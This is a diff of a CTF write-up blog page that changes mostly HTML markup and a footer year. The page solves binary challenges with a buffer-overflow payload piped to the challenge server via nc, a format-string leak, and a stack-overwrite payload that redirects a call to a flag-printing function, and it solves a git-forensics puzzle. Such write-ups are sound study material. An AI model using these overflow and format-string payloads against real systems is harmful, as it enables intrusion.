@@ -307,13 +307,13 @@ For me, this is a challenge for CTF beginners. Most of the challenges are easy t
 
 <h1 id="binary">Binary</h1>
 <h2 id="echo">echo</h2>
-<p>Basic BOF. Launch IDA Pro and we can see there’s a gets() function in the main function. Just overwrite the return address to control the <code class="highlighter-rouge">eip</code> jump to the <code class="highlighter-rouge">sample()</code> function, which cat the flag.<br />
-payload: <code class="highlighter-rouge">python -c 'print "A"*62+"\x4d\x85\x04\x08"' | nc hack.bckdr.in 8002</code></p>
+<p>Basic BOF. Launch IDA Pro and we can see there’s a gets() function in the main function. Just overwrite the return address to control the <code class="language-plaintext highlighter-rouge">eip</code> jump to the <code class="language-plaintext highlighter-rouge">sample()</code> function, which cat the flag.<br />
+payload: <code class="language-plaintext highlighter-rouge">python -c 'print "A"*62+"\x4d\x85\x04\x08"' | nc hack.bckdr.in 8002</code></p>
 
 <h2 id="team">team</h2>
 <p>Basic format string. To be honest I don’t think this challenge worth 600 pt…<br />
 The flag’s on the stack. Just leak it with the format string vulnerability, wrote a script concat the string and bang, CTF<br />
-payload: <code class="highlighter-rouge">%10$p.%11$p.%12$p.........%25$p</code></p>
+payload: <code class="language-plaintext highlighter-rouge">%10$p.%11$p.%12$p.........%25$p</code></p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">temp</span> <span class="o">=</span> <span class="p">[</span><span class="mi">35663364</span><span class="p">,</span><span class="mi">64363031</span><span class="p">,</span><span class="o">................................</span><span class="p">]</span>
 <span class="n">flag</span> <span class="o">=</span> <span class="s">""</span>
@@ -325,7 +325,7 @@ payload: <code class="highlighter-rouge">%10$p.%11$p.%12$p.........%25$p</code><
 <h2 id="forgot">forgot</h2>
 <p>Another binary with the BOF vulnerability. It’s a service that ask user to input their name and email address, and check the email address is whether a validate email address or not. 
 Inspect the binary with IDA Pro, we found the following line has the BOF vulnerability:
-<code class="highlighter-rouge">__isoc99_scanf("%s", &amp;v11); // v11 = [bp-0x74]</code>
+<code class="language-plaintext highlighter-rouge">__isoc99_scanf("%s", &amp;v11); // v11 = [bp-0x74]</code>
 Moreover, there’s a for loop with a switch-case in it to check the email address:</p>
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>  <span class="p">{</span>
     <span class="n">v9</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
@@ -338,18 +338,18 @@ Moreover, there’s a for loop with a switch-case in it to check the email addre
     <span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div></div>
-<p>To bypass the email address validation is simple, we just insert null byte in the beginning of the input, the <code class="highlighter-rouge">strlen()</code> will consider the string’s length is 0 and stop the checking.</p>
+<p>To bypass the email address validation is simple, we just insert null byte in the beginning of the input, the <code class="language-plaintext highlighter-rouge">strlen()</code> will consider the string’s length is 0 and stop the checking.</p>
 
 <p>I try to overwrite the return address first, which cause the program crash. So I switch to the IDA view and check the assembly, here’s what I found:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:08048A58                 sub     dword ptr [esp+78h], 1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:08048A58                 sub     dword ptr [esp+78h], 1
 .text:08048A5D                 mov     eax, [esp+78h]
 .text:08048A61                 mov     eax, [esp+eax*4+30h]
 .text:08048A65                 call    eax
 </code></pre></div></div>
 
-<p>So apparently before the main function end, it does something really interesting. The program took a value that store on the stack, do some calculation, and store it in the eax before calling it. If we can make the value that store at <code class="highlighter-rouge">[esp+78h]</code> 0, we can call whatever we want by controling the value store at <code class="highlighter-rouge">[esp+30h]</code>. But who should we call? After checking the text view in IDA Pro, I found that there’s one function that IDA Pro didn’t decompile it into pseudo code.</p>
+<p>So apparently before the main function end, it does something really interesting. The program took a value that store on the stack, do some calculation, and store it in the eax before calling it. If we can make the value that store at <code class="language-plaintext highlighter-rouge">[esp+78h]</code> 0, we can call whatever we want by controling the value store at <code class="language-plaintext highlighter-rouge">[esp+30h]</code>. But who should we call? After checking the text view in IDA Pro, I found that there’s one function that IDA Pro didn’t decompile it into pseudo code.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:080486CC                 push    ebp
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:080486CC                 push    ebp
 .text:080486CD                 mov     ebp, esp
 .text:080486CF                 sub     esp, 58h
 .text:080486D2                 mov     dword ptr [esp+0Ch], offset a_Flag ; "./flag"
@@ -365,20 +365,20 @@ Moreover, there’s a for loop with a switch-case in it to check the email addre
 .text:08048701                 retn
 </code></pre></div></div>
 
-<p>So just overwrite the stack, make <code class="highlighter-rouge">eax</code> be calculated to <code class="highlighter-rouge">0x080486CC</code>, then we can get the flag by executing the <code class="highlighter-rouge">call eax</code> instruction. Here’s the payload:</p>
+<p>So just overwrite the stack, make <code class="language-plaintext highlighter-rouge">eax</code> be calculated to <code class="language-plaintext highlighter-rouge">0x080486CC</code>, then we can get the flag by executing the <code class="language-plaintext highlighter-rouge">call eax</code> instruction. Here’s the payload:</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="s">"123</span><span class="se">\n</span><span class="s">"</span> <span class="c"># name</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x00\x00\x00\x00</span><span class="s">"</span> <span class="c"># for bypassing strlen</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">28</span> <span class="c"># padding</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xcc\x86\x04\x08</span><span class="s">"</span> <span class="c"># esp+0x30, print flag function</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">68</span> <span class="c"># padding</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x01\x00\x00\x00</span><span class="s">"</span> <span class="c"># esp+0x78</span>
-</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="s">"123</span><span class="se">\n</span><span class="s">"</span> <span class="c1"># name
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x00\x00\x00\x00</span><span class="s">"</span> <span class="c1"># for bypassing strlen
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">28</span> <span class="c1"># padding
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xcc\x86\x04\x08</span><span class="s">"</span> <span class="c1"># esp+0x30, print flag function
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">68</span> <span class="c1"># padding
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x01\x00\x00\x00</span><span class="s">"</span> <span class="c1"># esp+0x78
+</span></code></pre></div></div>
 
 <h1 id="misc">Misc</h1>
 <h2 id="tim">TIM</h2>
 <p>We got a github page, so it’s seems like a git/forensic challenge. After cloning the repository and check the git log, we found some intereting stuff.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>commit d444f3227636477902c4badc8e35a27cadab456c
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>commit d444f3227636477902c4badc8e35a27cadab456c
 Author: Abhay Rana &lt;capt.n3m0@gmail.com&gt;
 Date:   Tue Mar 31 17:59:09 2015 +0530
 
@@ -412,7 +412,7 @@ Date:   Tue Mar 31 17:59:08 2015 +0530
 </code></pre></div></div>
 
 <p>It’s seems like they convert some characters’ ASCII code into hex values and committed it. After converting them back to the normal character, we got the following message:<br />
-<code class="highlighter-rouge">Join first two characters of each commit sha1 FLAG</code><br />
+<code class="language-plaintext highlighter-rouge">Join first two characters of each commit sha1 FLAG</code><br />
 OK, so just do whatever it says, wrote a python script extract each commit sha1’s first 2 characters and concat them, we’ll get the flag. Notice that if the first 2 characters are “00”, just ignore them.</p>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ff</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"log"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span>
 <span class="n">flag</span> <span class="o">=</span> <span class="p">[]</span>
@@ -1130,7 +1130,6 @@ OK, so just do whatever it says, wrote a python script extract each commit sha1�
       <div class="grid__wrapper">
         
           
-          
 
 
 
@@ -1150,7 +1149,6 @@ OK, so just do whatever it says, wrote a python script extract each commit sha1�
 
         
           
-          
 
 
 
@@ -1169,7 +1167,6 @@ OK, so just do whatever it says, wrote a python script extract each commit sha1�
 </div>
 
         
-          
           
 
 
@@ -1192,7 +1189,6 @@ OK, so just do whatever it says, wrote a python script extract each commit sha1�
 
         
           
-          
 
 
 
@@ -1213,6 +1209,7 @@ OK, so just do whatever it says, wrote a python script extract each commit sha1�
         
       </div>
     </div>
+  
   
 </div>
 
@@ -1263,7 +1260,7 @@ OK, so just do whatever it says, wrote a python script extract each commit sha1�
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2019 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+<div class="page__footer-copyright">&copy; 2020 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
 
       </footer>
     </div>
